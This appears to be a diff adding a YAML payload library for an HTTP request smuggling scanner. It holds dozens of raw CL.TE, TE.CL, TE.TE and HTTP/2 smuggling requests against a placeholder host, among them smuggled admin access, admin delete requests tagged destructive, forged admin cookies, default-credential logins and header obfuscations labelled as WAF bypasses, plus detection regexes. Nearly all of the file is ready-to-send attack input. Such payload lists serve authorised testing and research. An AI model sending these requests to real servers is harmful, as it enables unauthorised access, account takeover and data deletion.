@@ -1,0 +1,282 @@
+metadata:
+  type: smuggling/cl
+  version: "1.0"
+  description: "HTTP request smuggling payloads (CL.TE, TE.CL, TE.TE)"
+  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings"]
+
+detection_patterns:
+  - "(?i)transfer-encoding"
+  - "(?i)content-length"
+  - "(?i)smuggled"
+
+payloads:
+  cl_te:
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED"
+      description: "Basic CL.TE smuggling"
+      severity: critical
+      tags: [cl_te, basic]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
+      description: "CL.TE with short body"
+      severity: critical
+      tags: [cl_te, basic]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "CL.TE with chunked body"
+      severity: critical
+      tags: [cl_te, chunked]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
+      description: "CL.TE admin access"
+      severity: critical
+      tags: [cl_te, admin]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nPOST /admin/delete HTTP/1.1\r\nHost: target.com\r\nContent-Length: 15\r\n\r\nuser=victim"
+      description: "CL.TE admin delete"
+      severity: critical
+      tags: [cl_te, admin, destructive]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 59\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nCookie: session=admin\r\n\r\n"
+      description: "CL.TE with cookie injection"
+      severity: critical
+      tags: [cl_te, cookie]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 71\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nCookie: admin=true\r\n\r\n"
+      description: "CL.TE admin cookie"
+      severity: critical
+      tags: [cl_te, admin, cookie]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 63\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /login HTTP/1.1\r\nContent-Length: 20\r\n\r\nuser=admin&pass=admin"
+      description: "CL.TE login smuggling"
+      severity: critical
+      tags: [cl_te, login]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nX-Forwarded-For: 127.0.0.1"
+      description: "CL.TE header injection"
+      severity: high
+      tags: [cl_te, header]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
+      description: "CL.TE request splitting"
+      severity: critical
+      tags: [cl_te, splitting]
+
+  te_cl:
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"
+      description: "Basic TE.CL smuggling"
+      severity: critical
+      tags: [te_cl, basic]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\nX"
+      description: "TE.CL with trailing data"
+      severity: critical
+      tags: [te_cl, basic]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
+      description: "TE.CL admin access"
+      severity: critical
+      tags: [te_cl, admin]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\nContent-Length: 15\r\n\r\nuser=admin"
+      description: "TE.CL admin POST"
+      severity: critical
+      tags: [te_cl, admin]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nCookie: admin=true\r\nHost: target.com\r\n\r\n"
+      description: "TE.CL cookie injection"
+      severity: critical
+      tags: [te_cl, cookie]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\nHost: target.com\r\n\r\n"
+      description: "TE.CL header injection"
+      severity: high
+      tags: [te_cl, header]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nPOST /login HTTP/1.1\r\nHost: target.com\r\nContent-Length: 20\r\n\r\nuser=admin&pass=admin"
+      description: "TE.CL login smuggling"
+      severity: critical
+      tags: [te_cl, login]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET /admin/delete HTTP/1.1\r\nHost: target.com\r\n\r\n"
+      description: "TE.CL admin delete"
+      severity: critical
+      tags: [te_cl, admin, destructive]
+
+  te_te:
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Basic TE.TE obfuscation"
+      severity: critical
+      tags: [te_te, basic]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "TE.TE case variation"
+      severity: critical
+      tags: [te_te, case]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "TE.TE identity encoding"
+      severity: critical
+      tags: [te_te, identity]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding : chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "TE.TE space before colon"
+      severity: critical
+      tags: [te_te, space]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "TE.TE multiple headers"
+      severity: critical
+      tags: [te_te, multiple]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \tchunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "TE.TE tab before value"
+      severity: critical
+      tags: [te_te, tab]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
+      description: "TE.TE admin access"
+      severity: critical
+      tags: [te_te, admin]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\nContent-Length: 15\r\n\r\nuser=admin"
+      description: "TE.TE admin POST"
+      severity: critical
+      tags: [te_te, admin]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nCookie: admin=true\r\nHost: target.com\r\n\r\n"
+      description: "TE.TE cookie injection"
+      severity: critical
+      tags: [te_te, cookie]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nPOST /login HTTP/1.1\r\nHost: target.com\r\nContent-Length: 20\r\n\r\nuser=admin&pass=admin"
+      description: "TE.TE login smuggling"
+      severity: critical
+      tags: [te_te, login]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunKed\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "TE.TE mixed case"
+      severity: critical
+      tags: [te_te, case]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked, cow\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "TE.TE multiple values"
+      severity: critical
+      tags: [te_te, multiple]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \x0bchunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "TE.TE vertical tab"
+      severity: critical
+      tags: [te_te, whitespace]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "TE.TE lowercase encoding"
+      severity: critical
+      tags: [te_te, case]
+
+  h2_smuggling:
+    - value: "POST / HTTP/2\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
+      description: "H2.CL smuggling"
+      severity: critical
+      tags: [h2, cl]
+
+    - value: "POST / HTTP/2\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
+      description: "H2.TE smuggling"
+      severity: critical
+      tags: [h2, te]
+
+    - value: "POST / HTTP/2\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\nContent-Length: 15\r\n\r\nuser=admin"
+      description: "H2 admin POST"
+      severity: critical
+      tags: [h2, admin]
+
+    - value: "POST / HTTP/2\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nCookie: admin=true\r\nHost: target.com\r\n\r\n"
+      description: "H2 cookie injection"
+      severity: critical
+      tags: [h2, cookie]
+
+    - value: "POST / HTTP/2\r\nHost: target.com\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n"
+      description: "H2 header injection"
+      severity: high
+      tags: [h2, header]
+
+    - value: "GET / HTTP/2\r\nHost: target.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
+      description: "H2 request smuggling via CRLF"
+      severity: critical
+      tags: [h2, crlf]
+
+  variant_detection:
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
+      description: "CL.TE detection - extra X"
+      severity: high
+      tags: [detection, cl_te]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 1\r\nTransfer-Encoding: chunked\r\n\r\n\r\n"
+      description: "CL.TE detection - empty chunk"
+      severity: high
+      tags: [detection, cl_te]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n\r\n"
+      description: "CL.TE detection - zero length"
+      severity: high
+      tags: [detection, cl_te]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
+      description: "TE.CL detection"
+      severity: high
+      tags: [detection, te_cl]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\n\r\n0\r\n\r\n"
+      description: "TE.TE detection"
+      severity: high
+      tags: [detection, te_te]
+
+  waf_bypass:
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Case variation TE"
+      severity: critical
+      tags: [waf_bypass, case]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \tchunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Tab before chunked"
+      severity: critical
+      tags: [waf_bypass, whitespace]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:  chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Extra space before chunked"
+      severity: critical
+      tags: [waf_bypass, whitespace]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chun\r\nked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Line wrapping TE"
+      severity: critical
+      tags: [waf_bypass, line_wrap]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Lowercase transfer-encoding"
+      severity: critical
+      tags: [waf_bypass, case]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Multiple TE headers"
+      severity: critical
+      tags: [waf_bypass, multiple]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked, identity\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Comma separated TE"
+      severity: critical
+      tags: [waf_bypass, comma]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Identity encoding"
+      severity: critical
+      tags: [waf_bypass, identity]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \x0bchunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Vertical tab in TE"
+      severity: critical
+      tags: [waf_bypass, whitespace]
+
+    - value: "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \x0cchunked\r\n\r\n5\r\nhello\r\n0\r\n\r\nSMUGGLED"
+      description: "Form feed in TE"
+      severity: critical
+      tags: [waf_bypass, whitespace]
